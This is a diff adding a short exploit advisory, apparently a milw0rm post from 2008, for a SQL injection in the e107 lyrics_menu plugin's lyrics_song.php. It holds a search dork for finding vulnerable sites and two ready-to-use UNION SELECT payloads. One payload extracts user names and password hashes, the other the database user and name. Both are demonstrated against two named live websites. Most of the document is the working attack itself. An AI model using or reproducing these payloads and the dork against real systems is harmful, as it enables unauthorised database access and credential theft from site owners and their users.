@@ -1,0 +1,39 @@
+e107 Plugin lyrics_menu lyrics_song.php (l_id) Remote Sql inj
+
+author: ZoRLu
+
+home: z0rlu.blogspot.com 
+
+concat: trt-turk@hotmail.com
+
+date: 30/10/2008 ( saat 23:36 the_k@m!l'lerdeyim a.q :) )
+
+n0te: YALNIZLIK YiTiRDi ANLAMINI YALNIZLIGIMDA  : ( (
+
+n0te: a.q kpss : ) )
+
+dork: allinurl:"lyrics_menu/lyrics_song.php?l_id="
+
+exploit:
+
+http://localhost/script_path/lyrics_song.php?l_id=[SQL1] or [SQL2]
+
+[SQL1] = column number 15
+
+-1+union+select+1,concat(user_name,0x3a,user_password),3,4,5,6,7,8,9,10,11,12,13,14,15+from+e107_user--
+
+example 1:
+
+http://www.mirage.org/e107_plugins/lyrics_menu/lyrics_song.php?l_id=-1+union+select+1,concat(user_name,0x3a,user_password),3,4,5,6,7,8,9,10,11,12,13,14,15++from+e107_user--
+
+[SQL2] = column number 17
+
+-1+union+select+1,2,3,concat(user(),0x3a,database()),5,6,7,8,9,10,11,12,13,14,15,16,17--
+
+example 2:
+
+http://www.reklamadatbazis.hu/e107_plugins/lyrics_menu/lyrics_song.php?l_id=-1+union+select+1,2,3,concat(user(),0x3a,database()),5,6,7,8,9,10,11,12,13,14,15,16,17--
+
+thanks: str0ke
+
+# milw0rm.com [2008-10-31]
